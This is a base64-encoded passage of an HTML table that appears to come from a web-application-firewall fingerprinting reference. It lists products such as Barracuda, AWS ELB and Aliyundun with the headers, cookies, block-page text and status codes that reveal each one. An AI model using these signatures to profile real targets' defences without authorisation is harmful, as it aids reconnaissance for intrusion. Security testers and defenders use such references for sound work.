ICAgICAgICAgICAgICAgICA8bGk+UmVzcG9uc2UgaGVhZGVycyBtYXkgY29u
dGFpbiA8Y29kZT5YLVBvd2VyZWQtQnktMzYwV1pCPC9jb2RlPiBoZWFkZXIu
PC9saT4KICAgICAgICAgICAgICAgICAgICA8bGk+QmxvY2tlZCByZXNwb25z
ZSBoZWFkZXJzIGNvbnRhaW4gdW5pcXVlIGhlYWRlciA8Y29kZT5XWldTLVJh
eTwvY29kZT4uPC9saT4KICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+
U2VydmVyPC9jb2RlPiBoZWFkZXIgbWF5IGNvbnRhaW4gdmFsdWUgPGNvZGU+
cWlhbnhpbi13YWY8L2NvZGU+LjwvbGk+CiAgICAgICAgICAgICAgICA8L3Vs
PgogICAgICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgog
ICAgPHRyPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgYWVTZWN1cmUKICAg
ICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgogICAg
ICAgICAgICAgICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6IDwvYj5Nb2RlcmF0
ZTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhv
ZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAg
ICAgICAgICAgICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNlIGNvbnRlbnQgY29u
dGFpbnMgPGNvZGU+YWVzZWN1cmVfZGVuaWVkLnBuZzwvY29kZT4gaW1hZ2Ug
KHZpZXcgc291cmNlIHRvIHNlZSkuPC9saT4KICAgICAgICAgICAgICAgICAg
ICA8bGk+UmVzcG9uc2UgaGVhZGVycyBjb250YWluIDxjb2RlPmFlU2VjdXJl
LWNvZGU8L2NvZGU+IHZhbHVlLjwvbGk+CiAgICAgICAgICAgICAgICA8L3Vs
PgogICAgICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgog
ICAgPHRyPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgQWlybG9jawogICAg
ICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAgICAgICAgICA8dWw+CiAgICAg
ICAgICAgICAgICA8bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPk1vZGVyYXRl
L0RpZmZpY3VsdDwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0
aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVs
PgogICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT5TZXQtQ29va2llPC9j
b2RlPiBoZWFkZXJzIG1heSBjb250YWluOjwvbGk+CiAgICAgICAgICAgICAg
ICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+
QUwtU0VTUzwvY29kZT4gY29va2llIGZpZWxkIG5hbWUgKGNhc2UgaW5zZW5z
aXRpdmUpLjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsaT48Y29k
ZT5BTC1MQjwvY29kZT4gdmFsdWUgKGNhc2UgaW5zZW5zaXRpdmUpLjwvbGk+
CiAgICAgICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgICAg
ICA8bGk+QmxvY2tlZCByZXNwb25zZSBwYWdlIGNvbnRhaW5zOjwvbGk+CiAg
ICAgICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgICAg
ICA8bGk+PGNvZGU+U2VydmVyIGRldGVjdGVkIGEgc3ludGF4IGVycm9yIGlu
IHlvdXIgcmVxdWVzdDwvY29kZT4gdGV4dC48L2xpPgogICAgICAgICAgICAg
ICAgICAgICAgICA8bGk+PGNvZGU+Q2hlY2sgeW91ciByZXF1ZXN0IGFuZCBh
bGwgcGFyYW1ldGVyczwvY29kZT4gdGV4dCBzbmlwcGV0LjwvbGk+CiAgICAg
ICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgIDwvdWw+CiAg
ICAgICAgICAgIDwvdWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8
dHI+CiAgICAgICAgPHRkPgogICAgICAgICAgICBBbGVydExvZ2ljCiAgICAg
ICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAg
ICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OjwvYj4gRGlmZmljdWx0
PC9saT4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3Rpb24gTWV0aG9k
b2xvZ3k6PC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAg
ICAgICAgICAgICAgPGxpPkJsb2NrZWQgcmVzcG9uc2UgcGFnZSBjb250YWlu
czo8L2xpPgogICAgICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAg
ICAgICAgICAgICAgPGxpPjxjb2RlPldlIGFyZSBzb3JyeSwgYnV0IHRoZSBw
YWdlIHlvdSBhcmUgbG9va2luZyBmb3IgY2Fubm90IGJlIGZvdW5kPC9jb2Rl
PiB0ZXh0IHNuaXBwZXQuPC9saT4KICAgICAgICAgICAgICAgICAgICAgICAg
PGxpPjxjb2RlPlRoZSBwYWdlIGhhcyBlaXRoZXIgYmVlbiByZW1vdmVkLCBy
ZW5hbWVkIG9yIHRlbXBvcmFyaWx5IHVuYXZhaWxhYmxlPC9jb2RlPiB0ZXh0
LjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT40MDQg
Tm90IEZvdW5kPC9jb2RlPiBpbiByZWQgbGV0dGVycy48L2xpPgogICAgICAg
ICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgICA8L3VsPgogICAg
ICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgPHRy
PgogICAgICAgIDx0ZD4KICAgICAgICAgICAgQWxpeXVuZHVuCiAgICAgICAg
PC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAg
ICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OjwvYj4gRWFzeTwvbGk+CiAg
ICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5Ojwv
Yj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAg
ICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNlIHBhZ2UgY29udGFpbnM6PC9saT4K
ICAgICAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAg
ICAgIDxsaT48Y29kZT5Tb3JyeSwgeW91ciByZXF1ZXN0IGhhcyBiZWVuIGJs
b2NrZWQgYXMgaXQgbWF5IGNhdXNlIHBvdGVudGlhbCB0aHJlYXRzIHRvIHRo
ZSBzZXJ2ZXIncyBzZWN1cml0eTwvY29kZT4gdGV4dCBzbmlwcGV0LjwvbGk+
CiAgICAgICAgICAgICAgICAgICAgICAgIDxsaT5SZWZlcmVuY2UgdG8gPGNv
ZGU+ZXJyb3JzLmFsaXl1bi5jb208L2NvZGU+IHNpdGUgVVJMLjwvbGk+CiAg
ICAgICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgICAgICA8
bGk+QmxvY2tlZCByZXNwb25zZSBjb2RlIHJldHVybmVkIGlzIDxjb2RlPjQw
NTwvY29kZT4uPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAg
ICAgIDwvdWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAg
ICAgICAgPHRkPgogICAgICAgICAgICBBbnF1YW5iYW8KICAgICAgICA8L3Rk
PgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAg
ICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6IDwvYj5FYXN5PC9saT4KICAgICAg
ICAgICAgICAgIDxsaT48Yj5EZXRlY3Rpb24gTWV0aG9kb2xvZ3k6PC9iPjwv
bGk+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAg
PGxpPlJldHVybnMgYmxvY2tlZCBIVFRQIHJlc3BvbnNlIGNvZGUgPGNvZGU+
NDA1PC9jb2RlPiB1cG9uIG1hbGljaW91cyByZXF1ZXN0cy48L2xpPgogICAg
ICAgICAgICAgICAgICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNlIGNvbnRlbnQg
bWF5IGNvbnRhaW4gPGNvZGU+L2FxYl9jYy9lcnJvci88L2NvZGU+IG9yIDxj
b2RlPmhpZGRlbl9pbnRlcmNlcHRfdGltZTwvY29kZT4uPC9saT4KICAgICAg
ICAgICAgICAgICAgICA8bGk+UmVzcG9uc2UgaGVhZGVycyBjb250YWluIDxj
b2RlPlgtUG93ZXJlZC1ieS1BbnF1YW5iYW88L2NvZGU+IGhlYWRlciBmaWVs
ZC48L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC91
bD4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8
dGQ+CiAgICAgICAgICAgIEFueXUKICAgICAgICA8L3RkPgogICAgICAgIDx0
ZD4KICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgPGxpPjxiPkRl
dGVjdGFiaWxpdHk6IDwvYj5FYXN5PC9saT4KICAgICAgICAgICAgICAgIDxs
aT48Yj5EZXRlY3Rpb24gTWV0aG9kb2xvZ3k6PC9iPjwvbGk+CiAgICAgICAg
ICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpPkJsb2NrZWQg
cmVzcG9uc2UgY29udGVudCBjb250YWlucyA8Y29kZT5Tb3JyeSEgeW91ciBh
Y2Nlc3MgaGFzIGJlZW4gaW50ZXJjZXB0ZWQgYnkgQW5ZdTwvY29kZT48L2xp
PgogICAgICAgICAgICAgICAgICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNlIHBh
Z2UgY29udGFpbnMgPGNvZGU+QW5ZdS0gdGhlIGdyZWVuIGNoYW5uZWw8L2Nv
ZGU+IHRleHQuPC9saT4KICAgICAgICAgICAgICAgICAgICA8bGk+UmVzcG9u
c2UgaGVhZGVycyBtYXkgY29udGFpbiB1bnVzdWFsIGhlYWRlciA8Y29kZT5X
WldTLVJBWTwvY29kZT4uPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAg
ICAgICAgICAgIDwvdWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8
dHI+CiAgICAgICAgPHRkPgogICAgICAgICAgICBBcHByb2FjaAogICAgICAg
IDwvdGQ+CiAgICAgICAgPHRkPgogICAgICAgICAgICA8dWw+CiAgICAgICAg
ICAgICAgICA8bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPkVhc3k8L2xpPgog
ICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8
L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAg
ICAgICA8bGk+QmxvY2tlZCByZXNwb25zZSBwYWdlIGNvbnRlbnQgbWF5IGNv
bnRhaW46PC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgPHVsPgogICAg
ICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPkFwcHJvYWNoIFdl
YiBBcHBsaWNhdGlvbiBGaXJld2FsbCBGcmFtZXdvcms8L2NvZGU+IGhlYWRp
bmcuPC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsaT48Y29k
ZT5Zb3VyIElQIGFkZHJlc3MgaGFzIGJlZW4gbG9nZ2VkIGFuZCB0aGlzIGlu
Zm9ybWF0aW9uIGNvdWxkIGJlIHVzZWQgYnkgYXV0aG9yaXRpZXMgdG8gdHJh
Y2sgeW91LjwvY29kZT4gd2FybmluZy48L2xpPgogICAgICAgICAgICAgICAg
ICAgICAgICAgICAgPGxpPjxjb2RlPlNvcnJ5IGZvciB0aGUgaW5jb252ZW5p
ZW5jZSE8L2NvZGU+IGtleXdvcmQuPC9saT4KICAgICAgICAgICAgICAgICAg
ICAgICAgICAgIDxsaT48Y29kZT5BcHByb2FjaCBpbmZyYXN0cnVjdHVyZSB0
ZWFtPC9jb2RlPiB0ZXh0IHNuaXBwZXQuPC9saT4KICAgICAgICAgICAgICAg
ICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+
U2VydmVyPC9jb2RlPiBoZWFkZXIgaGFzIGZpZWxkIHZhbHVlIHNldCB0byA8
Y29kZT5BcHByb2FjaDwvY29kZT4uPC9saT4KICAgICAgICAgICAgICAgIDwv
dWw+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+
CiAgICA8dHI+CiAgICAgICAgPHRkPgogICAgICAgICAgICBBcm1vciBEZWZl
bnNlCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1
bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+
RWFzeTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1l
dGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAg
ICAgICAgICAgICAgICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNlIGNvbnRlbnQg
Y29udGFpbnM6CiAgICAgICAgICAgICAgICAgICAgICAgIDx1bD4KICAgICAg
ICAgICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT5UaGlzIHJlcXVlc3Qg
aGFzIGJlZW4gYmxvY2tlZCBieSB3ZWJzaXRlIHByb3RlY3Rpb24gZnJvbSBB
cm1vcjwvY29kZT4gdGV4dC48L2xpPgogICAgICAgICAgICAgICAgICAgICAg
ICAgICAgPGxpPjxjb2RlPklmIHlvdSBtYW5hZ2UgdGhpcyBkb21haW4gcGxl
YXNlIGNyZWF0ZSBhbiBBcm1vciBzdXBwb3J0IHRpY2tldDwvY29kZT4gc25p
cHBldC48L2xpPgogICAgICAgICAgICAgICAgICAgICAgICA8L3VsPgogICAg
ICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgog
ICAgICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAg
PHRyPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgQXJ2YW5DbG91ZAogICAg
ICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAgICAgICAgICA8dWw+CiAgICAg
ICAgICAgICAgICA8bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPkVhc3k8L2xp
PgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9n
eTo8L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAg
ICAgICAgICA8bGk+PGNvZGU+U2VydmVyPC9jb2RlPiBoZWFkZXIgY29udGFp
bnMgPGNvZGU+QXJ2YW5DbG91ZDwvY29kZT4ga2V5d29yZC48L2xpPgogICAg
ICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8
L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAg
ICAgIEFTUEEKICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAg
ICAgPHVsPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6
IDwvYj5FYXN5PC9saT4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3Rp
b24gTWV0aG9kb2xvZ3k6PC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8dWw+
CiAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPlNlcnZlcjwvY29kZT4g
aGVhZGVyIGNvbnRhaW5zIDxjb2RlPkFTUEEtV0FGPC9jb2RlPiBrZXl3b3Jk
LjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPlJlc3BvbnNlIGNvbnRh
aW4gdW5pcXVlIGhlYWRlciA8Y29kZT5BU1BBLUNhY2hlLVN0YXR1czwvY29k
ZT4gd2l0aCBjb250ZW50IDxjb2RlPkhJVDwvY29kZT4gb3IgPGNvZGU+TUlT
UzwvY29kZT4uPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAg
ICAgIDwvdWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAg
ICAgICAgPHRkPgogICAgICAgICAgICBBU1AuTkVUIEdlbmVyaWMKICAgICAg
ICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgogICAgICAg
ICAgICAgICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6IDwvYj5Nb2RlcmF0ZTwv
bGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9s
b2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAg
ICAgICAgICAgIDxsaT5SZXNwb25zZSBoZWFkZXJzIG1heSBjb250YWluIDxj
b2RlPlgtQVNQTkVULVZlcnNpb248L2NvZGU+IGhlYWRlciB2YWx1ZS48L2xp
PgogICAgICAgICAgICAgICAgICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNlIHBh
Z2UgY29udGVudCBtYXkgY29udGFpbjo8L2xpPgogICAgICAgICAgICAgICAg
ICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGk+
PGNvZGU+VGhpcyBnZW5lcmljIDQwMyBlcnJvciBtZWFucyB0aGF0IHRoZSBh
dXRoZW50aWNhdGVkIHVzZXIgaXMgbm90IGF1dGhvcml6ZWQgdG8gdXNlIHRo
ZSByZXF1ZXN0ZWQgcmVzb3VyY2U8L2NvZGU+LjwvbGk+CiAgICAgICAgICAg
ICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+RXJyb3IgQ29kZSAweDAwMDAw
MDAwPDwvY29kZT4ga2V5d29yZC48L2xpPgogICAgICAgICAgICAgICAgICAg
ICAgICA8L3VsPgogICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT5YLVBv
d2VyZWQtQnk8L2NvZGU+IGhlYWRlciBoYXMgZmllbGQgdmFsdWUgc2V0IHRv
IDxjb2RlPkFTUC5ORVQ8L2NvZGU+LjwvbGk+CiAgICAgICAgICAgICAgICA8
L3VsPgogICAgICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3Ry
PgogICAgPHRyPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgQXN0cmEKICAg
ICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgogICAg
ICAgICAgICAgICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6IDwvYj5FYXN5PC9s
aT4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3Rpb24gTWV0aG9kb2xv
Z3k6PC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAg
ICAgICAgICAgPGxpPkJsb2NrZWQgcmVzcG9uc2UgcGFnZSBjb250ZW50IG1h
eSBjb250YWluOjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDx1bD4K
ICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT5Tb3JyeSwg
dGhpcyBpcyBub3QgYWxsb3dlZC48L2NvZGU+IGluIDxjb2RlPmgxPC9jb2Rl
Pi48L2xpPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2Rl
Pm91ciB3ZWJzaXRlIHByb3RlY3Rpb24gc3lzdGVtIGhhcyBkZXRlY3RlZCBh
biBpc3N1ZSB3aXRoIHlvdXIgSVAgYWRkcmVzcyBhbmQgd29udCBsZXQgeW91
IHByb2NlZWQgYW55IGZ1cnRoZXI8L2NvZGU+IHRleHQgc25pcHBldC48L2xp
PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxpPlJlZmVyZW5jZSB0
byA8Y29kZT53d3cuZ2V0YXN0cmEuY29tL2Fzc2V0cy9pbWFnZXMvPC9jb2Rl
PiBVUkwuPC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgPC91bD4KICAg
ICAgICAgICAgICAgICAgICA8bGk+UmVzcG9uc2UgY29va2llcyBoYXMgZmll
bGQgdmFsdWUgPGNvZGU+Y3pfYXN0cmFfY3NyZl9jb29raWU8L2NvZGU+IGlu
IHJlc3BvbnNlIGhlYWRlcnMuPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+
CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAg
ICA8dHI+CiAgICAgICAgPHRkPgogICAgICAgICAgICBBV1MgRUxCCiAgICAg
ICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAg
ICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+TW9kZXJhdGU8
L2xpPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2Rv
bG9neTo8L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAg
ICAgICAgICAgICA8bGk+UmVzcG9uc2UgaGVhZGVycyBtaWdodCBjb250YWlu
OgogICAgICAgICAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAg
ICAgICAgICAgICAgICA8bGk+PGNvZGU+QVdTQUxCPC9jb2RlPiBjb29raWUg
ZmllbGQgdmFsdWUuPC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgICAg
IDxsaT48Y29kZT5YLUFNWi1JRDwvY29kZT4gaGVhZGVyLjwvbGk+CiAgICAg
ICAgICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+WC1BTVotUkVRVUVT
VC1JRDwvY29kZT4gaGVhZGVyLjwvbGk+CiAgICAgICAgICAgICAgICAgICAg
ICAgIDwvdWw+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAg
ICAgICAgICAgICA8bGk+UmVzcG9uc2UgcGFnZSBtYXkgY29udGFpbjoKICAg
ICAgICAgICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAg
ICAgICAgICAgPGxpPjxjb2RlPkFjY2VzcyBEZW5pZWQ8L2NvZGU+IGluIHRo
ZWlyIGtleXdvcmQuPC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgICAg
IDxsaT5SZXF1ZXN0IHRva2VuIElEIHdpdGggbGVuZ3RoIGZyb20gMjAgdG8g
MjUgYmV0d2VlbiA8Y29kZT5SZXF1ZXN0SWQ8L2NvZGU+IHRhZy48L2xpPgog
ICAgICAgICAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAg
ICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPlNlcnZl
cjwvY29kZT4gaGVhZGVyIGZpZWxkIGNvbnRhaW5zIDxjb2RlPmF3c2VsYi8y
LjA8L2NvZGU+IHZhbHVlLjwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgog
ICAgICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAg
PHRyPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgQmFpZHUgWXVuamlhc3UK
ICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgog
ICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6IDwvYj5Nb2Rl
cmF0ZTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1l
dGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAg
ICAgICAgICAgICAgICAgIDxsaT48Y29kZT5TZXJ2ZXI8L2NvZGU+IGhlYWRl
ciBtYXkgY29udGFpbiA8Y29kZT5ZdW5qaWFzdS1uZ2lueDwvY29kZT4gdmFs
dWUuPC9saT4KICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+U2VydmVy
PC9jb2RlPiBoZWFkZXIgbWF5IGNvbnRhaW4gPGNvZGU+WXVuamlhc3U8L2Nv
ZGU+IHZhbHVlLgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAg
PC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAg
ICA8dGQ+CiAgICAgICAgICAgIEJhcmlrb2RlCiAgICAgICAgPC90ZD4KICAg
ICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxs
aT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAgICAg
ICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgog
ICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT5C
bG9ja2VkIHJlc3BvbnNlIHBhZ2UgY29udGVudCBjb250YWluczoKICAgICAg
ICAgICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgICAg
ICAgICAgPGxpPjxjb2RlPkJBUklLT0RFPC9jb2RlPiBrZXl3b3JkLjwvbGk+
CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+Rm9yYmlk
ZGVuIEFjY2VzczwvY29kZT4gdGV4dCBzbmlwcGV0IGluIDxjb2RlPmgxPC9j
b2RlPi48L2xpPgogICAgICAgICAgICAgICAgICAgICAgICA8L3VsPgogICAg
ICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgog
ICAgICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAg
PHRyPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgQmFycmFjdWRhCiAgICAg
ICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAg
ICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+TW9kZXJhdGU8
L2xpPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2Rv
bG9neTo8L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAg
ICAgICAgICAgICA8bGk+UmVzcG9uc2UgY29va2llcyBtYXkgY29udGFpbiA8
Y29kZT5iYXJyYV9jb3VudGVyX3Nlc3Npb248L2NvZGU+IHZhbHVlLjwvbGk+
CiAgICAgICAgICAgICAgICAgICAgPGxpPlJlc3BvbnNlIGhlYWRlcnMgbWF5
IGNvbnRhaW4gPGNvZGU+YmFycmFjdWRhXzwvY29kZT4ga2V5d29yZC48L2xp
PgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgIDxsaT5S
ZXNwb25zZSBwYWdlIGNvbnRhaW5zOjwvbGk+CiAgICAgICAgICAgICAgICA8
dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPllvdSBoYXZlIGJl
ZW4gYmxvY2tlZDwvY29kZT4gaGVhZGluZy48L2xpPgogICAgICAgICAgICAg
ICAgICAgIDxsaT48Y29kZT5Zb3UgYXJlIHVuYWJsZSB0byBhY2Nlc3MgdGhp
cyB3ZWJzaXRlPC9jb2RlPiB0ZXh0LjwvbGk+CiAgICAgICAgICAgICAgICA8
L3VsPgogICAgICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3Ry
PgogICAgPHRyPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgQmVrY2h5CiAg
ICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAg
ICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwv
bGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9s
b2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAg
ICAgICAgICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNlIGhlYWRlcnMgY29udGFp
bnMgPGNvZGU+QmVrY2h5IC0gQWNjZXNzIERlbmllZDwvY29kZT4uPC9saT4K
ICAgICAgICAgICAgICAgICAgICA8bGk+QmxvY2tlZCByZXNwb25zZSBwYWdl
IGNvbnRhaW5zIHJlZmVyZW5jZSB0byA8Y29kZT5odHRwczovL2Jla2NoeS5j
b20vcmVwb3J0PC9jb2RlPi48L2xpPgogICAgICAgICAgICAgICAgPC91bD4K
ICAgICAgICAgICAgPC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAg
IDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIEJpbmFyeVNlYwogICAg
ICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAgICAgICAgICA8dWw+CiAgICAg
ICAgICAgICAgICA8bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPk1vZGVyYXRl
PC9saT4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3Rpb24gTWV0aG9k
b2xvZ3k6PC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAg
